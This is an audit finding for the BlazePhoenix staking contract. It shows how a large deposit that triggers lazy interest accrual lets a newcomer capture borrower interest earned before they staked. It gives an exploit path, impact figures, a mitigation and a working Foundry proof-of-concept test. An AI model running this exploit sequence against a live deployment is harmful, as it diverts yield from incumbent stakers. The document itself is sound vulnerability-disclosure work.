# Just-in-time stakers can capture previously accrued borrower interest by entering before maintenance realizes it

## Severity: Medium

## Summary

BlazePhoenix distributes 97% of borrower interest to debt-free stakers through `accPureYieldPerShare`. But borrower interest is not continuously reflected in this accumulator as time passes. Instead, interest is realized lazily when `_accrueInterestFor()` executes for a borrower.

This creates a timing mismatch between **when interest economically accrues** and **which pure stakers receive that interest**.

A new staker's `deposit()` first adds their stake, calls `_resync()`, and therefore adds their boosted weight to `totalBoostedPure`. Only afterward does the function call `_autoMaintain()`:

```solidity
u.staked += amount_;
u.depositBlock = uint64(block.number);
totalStaked += amount_;

...

_resync(u);

emit Deposited(msg.sender, amount_, u.staked);

_autoMaintain(msg.sender);
```

`_resync()` updates the global pure-staker denominator and checkpoints the new position against the **current** accumulator:

```solidity
function _resync(UserInfo storage u) internal {
    (uint256 be, uint256 bp) = _computeBoost(u);
    _applyBoost(u, be, bp);
    _checkpoint(u);
}

function _checkpoint(UserInfo storage u) internal {
    u.rewardDebt =
        ML.mulDiv(u.trackedBoostedEffective, accRewardPerShare, WAD);

    u.pureYieldDebt =
        ML.mulDiv(u.trackedBoostedPure, accPureYieldPerShare, WAD);
}
```

For a debt-free depositor, `_computeBoost()` makes the newly deposited stake part of `totalBoostedPure`:

```solidity
bp = (u.debt == 0 && u.staked > 0)
    ? ML.mulDiv(u.staked, boost, BOOST_BASE)
    : 0;
```

The subsequent `_autoMaintain()` can then process an existing borrower:

```solidity
address who = _borrowers[idx];

...

try this.maintStep(who, beneficiary) {
} catch {
    ...
}
```

`maintStep()` realizes all interest accumulated by that borrower since `lastAccrueTime`:

```solidity
function maintStep(address who, address beneficiary) external {
    if (msg.sender != address(this)) revert Staking__NotSelf();

    _accrueInterestFor(who);

    ...
}
```

The problem occurs inside `_accrueInterestFor()`. Interest covering the entire elapsed interval is calculated at realization time, but its 97% pure-staker portion is divided using the **current** `totalBoostedPure`:

```solidity
uint256 elapsed = block.timestamp - u.lastAccrueTime;

uint256 interest = ML.mulDivSafe(
    ML.mulDivSafe(u.debt, _interestRate(), 10_000),
    elapsed,
    SECONDS_PER_YEAR
);

...

uint256 reserveCut =
    ML.mulDiv(interest, RESERVE_FACTOR_BPS, 10_000);

uint256 toPool = interest - reserveCut;

protocolReserve += reserveCut;

if (toPool > 0) {
    if (totalBoostedPure > 0) {
        accPureYieldPerShare +=
            ML.mulDiv(toPool, WAD, totalBoostedPure);

        totalRewardDistributed += toPool;
    } else {
        protocolReserve += toPool;
    }
}
```

Consequently, a user can enter **after a borrower has already accumulated interest**, but before that interest is materialized, and receive a share of the entire historical interest interval.

This is particularly exploitable because the attacker's own `deposit()` can perform both steps atomically: it first inserts the attacker into `totalBoostedPure`, then `_autoMaintain()` can accrue the stale borrower.

### Exploit path

Consider Alice as an incumbent pure staker, Bob as a borrower, and Carol as the attacker:

1. Alice deposits **1,000,000 BZPX** and remains debt-free.
2. Bob deposits **1,000,000 BZPX** and borrows **400,000 BZPX**.
3. Bob is not touched for 30 days. During this period, his debt economically generates interest, while Carol has no stake in the protocol.
4. Because `_accrueInterestFor(Bob)` has not executed, the historical interest has not yet increased `accPureYieldPerShare`.
5. After the 30-day interval, Carol deposits **30,000,000 BZPX** as a pure staker.
6. Carol's deposit calls `_resync()` first, adding her boosted position to `totalBoostedPure` and checkpointing her `pureYieldDebt` against the old accumulator.
7. The same deposit then calls `_autoMaintain(Carol)`, which reaches Bob and executes `_accrueInterestFor(Bob)`.
8. Bob's entire 30 days of historical interest is now distributed using `totalBoostedPure` that already includes Carol.
9. Carol therefore receives the overwhelming majority of pure yield generated during a period in which she had no stake.
10. After the 10-block claim restriction passes, Carol can call `claimPureYield()` and withdraw the captured yield.

The PoC demonstrates this in a single attacker deposit transaction:

```text
Before Carol deposit:

accPureYieldPerShare = 0
Carol pending yield  = 0

Bob has accumulated 30 days of unrealized interest.

Carol deposits 30,000,000 BZPX
    │
    ├─ _resync(Carol)
    │      └─ Carol enters totalBoostedPure
    │
    └─ _autoMaintain(Carol)
           └─ maintStep(Bob)
                  └─ _accrueInterestFor(Bob)
                         └─ historical interest distributed
                            using denominator containing Carol
```

Carol does not need to stake before the interest-generating period, predict a separate keeper transaction, or wait for future interest. In the demonstrated state, her own deposit both enters the denominator and triggers realization of the already accumulated yield.

## Impact

The PoC demonstrates actual redistribution of **30 days of borrower interest**.

The setup is:

| Participant | Position              |                           Stake / borrow | Present during 30-day interest interval? |
| ----------- | --------------------- | ---------------------------------------: | :--------------------------------------: |
| Alice       | Incumbent pure staker |                     1,000,000 BZPX stake |                  **Yes**                 |
| Bob         | Borrower              | 1,000,000 BZPX stake / 400,000 BZPX debt |                    Yes                   |
| Carol       | JIT pure staker       |                    30,000,000 BZPX stake |                  **No**                  |

Before Carol enters, the pure-yield accumulator remains:

```text
accPureYieldPerShare = 0
```

Carol then deposits after the entire 30-day interval. Her deposit triggers maintenance of Bob, realizing:

```text
Bob interest accrued = 348.493150684931506849 BZPX
```

The protocol reserves 3% and distributes approximately 97% to pure stakers:

```text
Interest                            348.493150684931506849 BZPX
3% protocol reserve                ~10.454794520547945205 BZPX
97% pure-staker distribution       ~338.038356164383561644 BZPX
```

Because Carol's 30,000,000 BZPX stake was inserted into `totalBoostedPure` before Bob's historical interest was realized, the PoC observes:

| Recipient            | Stake during historical interval | Yield allocated after realization | Share of pure-staker distribution |
| -------------------- | -------------------------------: | --------------------------------: | --------------------------------: |
| Alice--> incumbent    |                   1,000,000 BZPX |         **10.9044631020765 BZPX** |                            ~3.23% |
| Carol--> JIT attacker |                       **0 BZPX** |         **327.133893062295 BZPX** |                           ~96.77% |
| **Total**            |                                  |        **338.0383561643715 BZPX** |                             ~100% |

The tiny difference from the theoretical 97% amount is attributable to accumulator rounding.

The resulting allocation closely follows the pure-staker weights present **at realization time**:

```text
Carol = 30M / (30M + 1M) ≈ 96.77%
Alice =  1M / (30M + 1M) ≈  3.23%
```

Therefore, Carol captures approximately **327.13 BZPX**, or **96.77% of the pure-staker distribution**, despite having zero stake throughout the entire 30-day interval that generated the underlying interest.

The PoC further confirms that this is not merely an accounting artifact. After the 10-block restriction passes, Carol successfully calls `claimPureYield()` and receives:

```text
Carol historical yield actually paid:
327.133893062295 BZPX
```

The protocol remains solvent because no additional BZPX is created or removed. The vulnerability instead redistributes legitimately generated interest from incumbent pure stakers to a user who enters immediately before its lazy realization.

The economic impact can become substantially larger when multiple borrowers have long-unrealized interest. Since autonomous maintenance realizes borrower interest only when positions are scanned, an opportunistic large depositor can enter before stale positions are processed and capture a proportional share of interest generated before their capital entered the protocol.

This is also notable given the protocol's explicit treatment of backlog capture elsewhere: emission accounting advances `lastRewardTime` during empty periods specifically so that a latecomer cannot capture historical emission. Pure-yield accounting lacks an equivalent temporal boundary and instead allocates elapsed borrower interest according to the pure-staker set existing only when that interest is eventually realized.

## Mitigation

Interest generated before a user's stake enters the pure-yield pool should not be distributable to that user.

The simplest architectural fix is to **realize outstanding borrower interest before modifying `totalBoostedPure`** when a transaction adds or materially increases a pure-staker position.

For `deposit()`, maintenance/accrual of outstanding borrower interest should therefore occur before the new deposit is included in the pure-yield denominator:

```solidity
_updateGlobal();
_settlePendingRewards(msg.sender);
_settlePendingPureYield(msg.sender);
_accrueInterestFor(msg.sender);
_processLockExpiry(msg.sender);

// Realize outstanding interest against the pre-deposit
// pure-staker denominator.
_autoMaintain(msg.sender);

if (!ML.rawTransferFrom(
    bzpx,
    msg.sender,
    address(this),
    amount_
)) revert Staking__TransferFailed();

u.staked += amount_;
totalStaked += amount_;

...

_resync(u);
```

Regression tests should specifically assert that:

* a staker entering after an interest-accrual interval receives **zero** yield attributable to that historical interval;
* adding a large pure staker immediately before borrower maintenance does not reduce incumbent stakers' entitlement to previously accrued interest;
* the same historical interest distribution is obtained regardless of whether a new depositor triggers its realization; and
* the 10-block claim restriction cannot convert historical interest into entitlement merely by delaying withdrawal after the allocation has already occurred.


## POC

Add this tests to your test suite `Blaze-Phoenix-Staking/test/BlazePhoenixStaking.t.sol`


```solidity
    function test_bug_jitStakerCapturesPreviouslyAccruedPureYield() public {
    // Alice = incumbent pure staker
    // Bob   = borrower whose interest will remain unmaterialized
    // Carol = JIT attacker

    // 1. Alice enters first and is the ONLY pure-yield staker while
    //    Bob's interest economically accrues.
    vm.prank(alice);
    staking.deposit(1_000_000e18, 365);

    // Bob creates a borrowing position.
    vm.prank(bob);
    staking.deposit(1_000_000e18, 365);

    vm.roll(block.number + 2);

    vm.prank(bob);
    staking.borrow(400_000e18);

    assertTrue(staking.isTrackedBorrower(bob));
    assertEq(staking.pendingPureYield(carol), 0);

    // Record the accumulator before the stale interval.
    uint256 accBefore = staking.accPureYieldPerShare();

    // 2. Let Bob's debt generate interest for 30 days WITHOUT touching
    //    Bob or executing any transaction that can maintain him.
    //
    // During this entire interval Carol has ZERO stake.
    vm.warp(block.timestamp + 30 days);
    vm.roll(block.number + 20);

    assertEq(staking.pendingPureYield(carol), 0);

    // The interest has not yet been materialized into the pure-yield
    // accumulator because Bob has not been accrued.
    assertEq(
        staking.accPureYieldPerShare(),
        accBefore,
        "stale borrower interest should not yet be distributed"
    );

    // 3. Carol enters AFTER the entire 30-day interest interval.
    //
    // deposit() first adds Carol's stake and calls _resync(), which adds
    // her boosted pure weight to totalBoostedPure.
    //
    // Only AFTER that does deposit() call _autoMaintain(carol).
    // Maintenance reaches Bob and calls _accrueInterestFor(bob).
    //
    // Therefore Bob's OLD 30-day interest is divided using a denominator
    // that already includes Carol.
    vm.prank(carol);
    staking.deposit(30_000_000e18, 365);

    uint256 accAfter = staking.accPureYieldPerShare();

    assertGt(
        accAfter,
        accBefore,
        "Bob's stale interest should be materialized by Carol's deposit"
    );

    // 4. Smoking gun:
    //
    // Carol had no stake during the entire period in which this interest
    // accrued, yet immediately after entering she already owns pure yield.
    uint256 carolCaptured = staking.pendingPureYield(carol);

    assertGt(
        carolCaptured,
        0,
        "BUG: JIT staker captures interest accrued before joining"
    );

    uint256 aliceAfter = staking.pendingPureYield(alice);

    emit log_named_uint(
        "Alice incumbent pure yield after realization",
        aliceAfter
    );

    emit log_named_uint(
        "Carol JIT historical yield captured",
        carolCaptured
    );

    emit log_named_uint(
        "Pure-yield accumulator before Carol",
        accBefore
    );

    emit log_named_uint(
        "Pure-yield accumulator after Carol",
        accAfter
    );

    // 5. The 10-block flash-loan protection only delays claiming.
    // It does NOT undo Carol's entitlement to the historical yield.
    vm.roll(block.number + 11);

    uint256 carolBalanceBefore = token.balanceOf(carol);

    vm.prank(carol);
    staking.claimPureYield();

    uint256 carolPaid =
        token.balanceOf(carol) - carolBalanceBefore;

    emit log_named_uint(
        "Carol historical yield actually paid",
        carolPaid
    );

    assertGt(
        carolPaid,
        0,
        "BUG: historical pure yield should be withdrawable after block delay"
    );

    assertTrue(staking.isSolvent());
}
```